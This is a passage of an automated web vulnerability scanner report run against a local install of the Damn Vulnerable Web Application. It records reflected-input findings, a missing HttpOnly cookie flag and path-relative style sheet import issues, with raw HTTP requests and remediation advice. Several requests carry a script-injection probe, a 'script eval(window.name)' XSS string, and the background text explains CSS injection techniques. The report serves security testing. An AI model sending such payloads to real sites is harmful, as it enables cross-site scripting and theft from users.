<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: 82022<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;http://localhost:7878/dvwa/index.php<span class="HIGHLIGHT">5g6c2620wg</span> &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;http://localhost:7878/dvwa/index.php<span class="HIGHLIGHT">5g6c2620wg</span> &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;http://localhost:7878/dvwa/index.php<span class="HIGHLIGHT">5g6c2620wg</span>&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="14.4.2">14.4.2.&nbsp;http://localhost:7878/dvwa/phpinfo.php [User-Agent HTTP header]</span>
<br><a class="PREVNEXT" href="#14.4.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.4.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>User-Agent</b> HTTP header is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">uny9iavtpp</span><br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:24 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: 82022<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">uny9iavtpp</span> &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">uny9iavtpp</span> &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<span class="HIGHLIGHT">uny9iavtpp</span>&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="14.4.3">14.4.3.&nbsp;http://localhost:7878/dvwa/phpinfo.php [name of an arbitrarily supplied URL parameter]</span>
<br><a class="PREVNEXT" href="#14.4.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#14.4.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The name of an arbitrarily supplied URL parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php?<span class="HIGHLIGHT">xc4q2b5p7w</span>=1 HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:14 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: 82165<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;<span class="HIGHLIGHT">xc4q2b5p7w</span>=1 &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;/dvwa/phpinfo.php?<span class="HIGHLIGHT">xc4q2b5p7w</span>=1 &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;GET /dvwa/phpinfo.php?<span class="HIGHLIGHT">xc4q2b5p7w</span>=1 HTTP/1.1 &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="e"&gt;$_REQUEST['<span class="HIGHLIGHT">xc4q2b5p7w</span>']&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="e"&gt;$_GET['<span class="HIGHLIGHT">xc4q2b5p7w</span>']&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;<span class="HIGHLIGHT">xc4q2b5p7w</span>=1&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;/dvwa/phpinfo.php?<span class="HIGHLIGHT">xc4q2b5p7w</span>=1&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="14.4.4">14.4.4.&nbsp;http://localhost:7878/dvwa/phpinfo.php [security cookie]</span>
<br><a class="PREVNEXT" href="#14.4.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/phpinfo.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/phpinfo.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">lannrj5837</span>; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:09 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol; path=/<br>Set-Cookie: security=low<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br>Content-Length: 82208<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;<br>&lt;style type="text/css"&gt;<br>body {background-color: #fff; co<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;security=low<span class="HIGHLIGHT">lannrj5837</span>; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;security=low<span class="HIGHLIGHT">lannrj5837</span>; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol &lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;low<span class="HIGHLIGHT">lannrj5837</span>&lt;/td&gt;<br><b>...[SNIP]...</b><br>&lt;td class="v"&gt;security=low<span class="HIGHLIGHT">lannrj5837</span>; PHPSESSID=15qtci8c3dfjk6ta6hmf6r98ol&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="15">15.&nbsp;http://localhost:7878/dvwa/security.php</span>
<br><a class="PREVNEXT" href="#14">Previous</a>
&nbsp;<a class="PREVNEXT" href="#16">Next</a>
<br>
<span class="BODH1" id="15.1">15.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500600_cookiewithouthttponlyflagset">Cookie without HttpOnly flag set</a></span>
<br><a class="PREVNEXT" href="#14.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#15.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/security.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href='https://portswigger.net/web-security/cross-site-scripting/exploiting'>Web Security Academy: Exploiting XSS vulnerabilities</a></li>
<li><a href='https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly'>HttpOnly effectiveness</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/31.html">CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=4s328j6t9p6m7uts0f4llcjoh3<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 77<br><br>security=low&amp;seclev_submit=Submit&amp;user_token=5167251e91ccebdf7ccab1012fb169e0</span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 302 Found<br>Date: Fri, 11 Mar 2022 07:31:16 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br><span class="HIGHLIGHT">Set-Cookie: PHPSESSID=4s328j6t9p6m7uts0f4llcjoh3; path=/</span><br>Set-Cookie: security=low<br>Location: /dvwa/security.php<br>Content-Length: 0<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="15.2">15.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#15.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#16.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/security.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/security.php?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=1mi8jltafs8gu90gil06r28mt8<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:44 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5263<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;DVWA Security :: Damn Vulnerable Web Application (DVWA) v1.10 *Developme<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/security.php<span class="HIGHLIGHT">/a20ma2/</span>?test=%22%3E%3Cscript%3Eeval(window.name)%3C/script%3E HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=1mi8jltafs8gu90gil06r28mt8<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:24 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5263<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;DVWA Security :: Damn Vulnerable Web Application (DVWA) v1.10 *Developme<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/security.php/a20ma2/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=1mi8jltafs8gu90gil06r28mt8<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/security.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:24 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5263<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;DVWA Security :: Damn Vulnerable Web Application (DVWA) v1.10 *Developme<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="16">16.&nbsp;http://localhost:7878/dvwa/setup.php</span>
<br><a class="PREVNEXT" href="#15">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17">Next</a>
<br>
<span class="BODH1" id="16.1">16.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#15.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/setup.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
